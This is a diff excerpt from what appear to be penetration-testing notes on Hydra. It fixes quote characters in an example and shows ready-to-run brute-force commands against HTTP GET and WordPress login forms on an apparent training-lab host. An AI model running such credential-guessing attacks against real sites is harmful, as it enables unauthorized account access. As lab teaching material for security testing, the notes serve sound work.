@@ -60,7 +60,7 @@ hydra -L users-txt -P pass.txt http-get://localhost/
 hydra -U http-post-form   
 # This will return:
 # 	 <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
-# 	 Example: “/login.php:userin=^USER^&passin=^PASS^:incorrect”
+# 	 Example: "/login.php:userin=^USER^&passin=^PASS^:incorrect"
 #	 it perform the attack in the login.php page. It uses the input label name userin (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for users. It uses the input label name passin  (or any other, we need to retrieve this from the html code of the form) to insert the dictionary for passwords. It uses the word incorrect to check out the result of the login process (we need to observe the web behaviour to pick a word). For example:
 hydra -l pentester -P /usr/share/wordlists/metasploit/password.lst zev0nlxhh78mfshrhzvq9h8vm.eu-central-4.attackdefensecloudlabs.com http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1:S=Success"
 
